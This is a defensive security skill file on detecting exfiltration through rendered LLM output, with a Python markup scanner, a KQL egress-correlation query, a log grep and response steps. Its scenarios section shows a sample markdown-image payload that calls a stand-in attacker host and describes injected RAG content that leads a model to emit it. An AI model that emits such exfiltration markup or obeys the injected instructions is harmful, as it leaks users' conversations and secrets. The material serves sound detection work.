---
name: detecting-llm-output-rendering-exfiltration
description: 'Detects data exfiltration through rendered LLM output (ATLAS AML.T0077 LLM Response Rendering) where attacker-influenced model output embeds a markdown image, HTML img, CSS url, or link whose query string carries conversation data or tokens to an attacker host, leaking the moment a chat UI renders it with zero clicks for images. Works by scanning raw output before render for image or link markup to non-allowlisted hosts, flagging high-entropy URL payloads that mirror current context, and correlating client egress from proxy, DNS, and CSP reports with the assistant turn. Use when investigating markdown-image exfiltration, zero-click chat data leaks, or suspicious outbound fetches from a chat surface after untrusted content was ingested. Keywords: AML.T0077, markdown image exfiltration, zero-click, CSP img-src, link unfurl, data egress, forward proxy logs, OWASP LLM02. Do not use for the injection that plants the payload - use detecting-indirect-prompt-injection.'
domain: cybersecurity
subdomain: ai-security
tags:
- ai-security
- llm
- data-exfiltration
- output-rendering
- markdown-image
- csp
- egress-monitoring
- ai-agent
version: '1.0'
author: team-cybersecurity
license: Apache-2.0
nist_ai_rmf:
- MEASURE-2.7
- MAP-5.1
- MANAGE-2.4
- MEASURE-2.6
atlas_techniques:
- AML.T0077
---
# Detecting LLM Output-Rendering Exfiltration

## When to Use

- A chat or agent UI makes an outbound fetch to an unfamiliar host right after an assistant turn.
- You are hunting markdown-image or encoded-link exfiltration ("zero-click" leaks) on a surface that renders model output as rich markdown or HTML.
- An assistant turn followed ingestion of untrusted content (web page, RAG document, email, tool output) and you need to confirm whether conversation data left the client.
- You are validating that render-time host allowlists, CSP, and image-proxy controls on a chat surface actually block the egress channel.
- A link-unfurl or server-side URL preview service resolved a URL that appears to carry sensitive data.

This skill owns the rendering and egress leak only. The injection that plants the leaking instruction is a separate concern (see Response).

## Prerequisites

- Access to the raw assistant output before client render — captured from agent framework traces (Langfuse, LangSmith, OpenTelemetry GenAI `gen_ai.completion` spans) or application logs of the model response.
- Egress telemetry from the chat surface: forward-proxy / secure web gateway access logs, CDN or WAF logs, and DNS resolver logs.
- A defined render allowlist: the small set of first-party and CDN hosts the UI is expected to fetch images, links, and styles from. This baseline is load-bearing; without it every detection is noise.
- Optional: browser Content-Security-Policy violation reports (`report-to` / `report-uri`) collected from the chat surface, and logs from any server-side link-unfurl or image-proxy service.
- Python 3.9+ for the scanning snippets.

## Workflow

1. **Capture output pre-render.** Pull the raw assistant message from traces or app logs before the client turns markdown/HTML into fetches. This is where the embedded markup and encoded payload are visible.
2. **Scan for egress markup.** Extract every image, link, CSS `url()`, `<link>`, and remote SVG reference. Resolve each host and flag any host not on the render allowlist.
3. **Shape-check the URL payload.** For each flagged URL, test the path and query for long, base64/hex/percent-encoded, or high-entropy segments. Compare the decoded blob against the current conversation and retrieved context; a near-duplicate of context contents is strong exfil evidence.
4. **Correlate egress.** Join the assistant turn to a client GET (proxy/CDN/WAF), a CSP violation report, or a DNS resolution for the same external host within a short window of the turn. Raise severity when the turn also ingested untrusted content.
5. **Cover server-side unfurl.** Check link-preview and image-proxy logs: a hardened client can still leak when a preview service resolves the URL on the user's behalf.
6. **Triage and contain.** Confirm the leaked data, sever the egress path, then trace back to the injection source and purge it.

## Key Concepts

- **Rendering is the egress step.** The model emits text; the browser or a preview service performs the outbound request when it renders an image, unfurls a link, or fetches CSS/favicon/SVG assets. Images fetch with zero user interaction; links need a click or an automatic preview.
- **Data rides in the URL.** Secrets are encoded into the path or query string of an attacker-controlled host, so a single GET carries them out. The payload often mirrors conversation history, retrieved documents, tokens, or prior-turn secrets.
- **Cause vs. channel.** Indirect prompt injection plants the instruction; this skill detects the output markup and the resulting fetch. Keep them separate so detections stay focused on markup plus egress, not input filtering.
- **Allowlist baseline.** Legitimate UIs fetch assets from a small, known host set. A fetch to an arbitrary domain is the anomaly, so false positives come almost entirely from legitimately user-supplied markdown images — tune the allowlist accordingly.
- **Multi-source correlation.** The highest-confidence signal joins three sources: the trace (markup in output), the proxy/DNS (the fetch), and the ingestion context (untrusted content earlier in the turn).

## Tools & Systems

| Role | Tools |
|------|-------|
| Capture raw output | Langfuse, LangSmith, OpenTelemetry GenAI spans, application logs |
| Egress telemetry | Forward proxy / secure web gateway access logs, CDN and WAF logs, passive DNS |
| Browser-side signal | Content-Security-Policy violation reports (`report-to`/`report-uri`) |
| Server-side render | Link-unfurl / URL-preview service logs, email image-proxy logs |
| Render hardening | Markdown renderers with image/link allowlists, DOMPurify for HTML sanitisation, CSP (`img-src`, `connect-src`, `default-src`) |

No single commercial "render-exfil" product is standard; detection is composed from tracing plus egress telemetry.

## Detection Queries

Scan raw model output for egress markup to non-allowlisted hosts (defensive scanner; tune the allowlist):

```python
import base64, binascii, re
from urllib.parse import urlparse, unquote

ALLOWLIST = {"cdn.example-first-party.com", "assets.example.com"}  # verify/tune per app

def decode_candidates(seg):
    """Yield the segment and any successful percent/base64/hex decodings of it.
    The payload is encoded by assumption, so comparing the RAW segment against a
    plaintext context blob can never match - decode first."""
    out = [seg]
    pct = unquote(seg)
    if pct != seg:
        out.append(pct)
    for s in list(out):
        body = s.strip("=")
        try:  # base64 / base64url
            pad = s + "=" * (-len(s) % 4)
            out.append(base64.urlsafe_b64decode(pad).decode("utf-8", "ignore"))
        except (binascii.Error, ValueError):
            pass
        if len(body) >= 24 and len(body) % 2 == 0 and re.fullmatch(r"[0-9a-fA-F]+", body):
            try:
                out.append(bytes.fromhex(body).decode("utf-8", "ignore"))
            except ValueError:
                pass
    return [o for o in out if o and o.strip()]

def shingles(text, n=5):
    toks = re.findall(r"[a-z0-9]+", text.lower())
    return {" ".join(toks[i:i + n]) for i in range(max(0, len(toks) - n + 1))}

# markdown image/link, HTML src/href, CSS url()
URL_MARKUP = re.compile(
    r"""!?\[[^\]]*\]\((?P<md>[^)]+)\)      # markdown image or link
      | (?:src|href)\s*=\s*["'](?P<attr>[^"']+)["']  # HTML attribute
      | url\(\s*['"]?(?P<css>[^)'"]+)""",
    re.VERBOSE | re.IGNORECASE,
)

def scan_output(text, context_blob):
    ctx_shingles = shingles(context_blob)
    findings = []
    for m in URL_MARKUP.finditer(text):
        url = m.group("md") or m.group("attr") or m.group("css")
        if not url:
            continue
        host = (urlparse(url).hostname or "").lower()
        if host and host not in ALLOWLIST:
            parsed = urlparse(url)
            qp = parsed.query + parsed.path
            # long, encoded, or context-mirroring payload = likely exfil
            encoded = bool(re.search(r"[A-Za-z0-9+/=_%-]{24,}", qp))
            # Decode each long segment, then compare the DECODED text to the context
            # (shingle overlap, so re-wrapping/truncation still matches).
            mirrors_ctx = False
            for seg in re.split(r"[/?&=;]", qp):
                if len(seg) < 24:
                    continue
                for cand in decode_candidates(seg):
                    if ctx_shingles & shingles(cand):
                        mirrors_ctx = True
                        break
                if mirrors_ctx:
                    break
            findings.append({
                "url": url, "host": host,
                "non_allowlisted": True,
                "encoded_payload": encoded,
                "mirrors_context": mirrors_ctx,
            })
    return findings
```

Correlate the assistant turn with a client egress event (KQL-style; field names are illustrative — verify against your schema):

```kql
let window = 5s;   // verify/tune
LLMTraces
| where SpanName == "gen_ai.completion"
| project turn_time = Timestamp, session_id, output = CompletionText
| join kind=inner (
    ProxyAccessLogs
    | project fetch_time = TimeGenerated, client_ip, dest_host, url_full
  ) on $left.session_id == $right.client_ip   // map to your session<->client join key
| where fetch_time between (turn_time .. turn_time + window)
| where dest_host !in (dynamic(["cdn.example-first-party.com","assets.example.com"]))
| where output contains dest_host  // 'contains' not 'has': a dotted hostname is tokenised, so term-based 'has' is unreliable
| project turn_time, fetch_time, session_id, dest_host, url_full
```

Proxy-log heuristic for encoded payloads leaving the chat origin (shell, illustrative fields):

```bash
# flag long base64/hex-ish query strings in client fetches from the chat surface
awk -F'"' '/chat-app-origin/ {print $2}' proxy_access.log \
  | grep -E '\?[A-Za-z0-9+/=_%-]{40,}' \
  | sort -u
```

## Common Scenarios

- **Markdown-image zero-click leak.** Injected RAG content coaxes the model to emit `![x](https://attacker.tld/p?d=ENCODED)`; the client renders the image and the GET carries encoded conversation data out with no clicks. Signal: non-allowlisted image host in output + proxy GET within the turn window.
- **Encoded-link exfiltration.** A clickable or auto-previewed link whose query string holds tokens or prior-message text. Signal: link host off allowlist + unfurl-service log resolving it server-side.
- **CSS / SVG side channel.** Output includes inline CSS `url()` or a remote SVG reference that fetches an attacker host on render. Signal: CSP `img-src`/`connect-src` violation report naming the host.
- **Hardened client, leaky preview.** The end client blocks remote images but a chat platform unfurls the URL on the server. Signal: preview-service log shows the fetch even though the browser did not.

## Output Format

Report each finding with:

- Assistant turn id, session, and timestamp.
- The offending markup and the extracted URL / host.
- Whether the host is non-allowlisted, whether the payload is encoded, and whether it mirrors current context.
- The correlated egress evidence (proxy GET, DNS resolution, CSP report, or unfurl-service entry) with timing relative to the turn.
- The upstream ingestion source for the turn (web, RAG, email, tool output), if identified.
- Severity: confirmed (egress observed + payload mirrors context), suspected (markup only), or benign (allowlisted / user-supplied image).

## Response

- **Contain first (RS.MI-01).** Sever the egress path before chasing attribution: block the attacker domain at proxy and DNS, quarantine the conversation, and disable auto-loading of remote images on the surface.
- **Prevent by construction.** Enforce a strict render-time host allowlist for images and links, route external images through a sanitising proxy that strips query strings, and apply a restrictive `img-src` / `connect-src` / `default-src` CSP on the chat surface. Harden server-side unfurlers the same way.
- **Rotate exposed secrets.** Treat any credential, token, or sensitive datum present in the leaked context as compromised and rotate it.
- **Trace to the cause.** Find and purge the injection source (RAG document, web page, email) that planted the leaking instruction. Detecting and filtering that injection is the sibling skill detecting-indirect-prompt-injection.
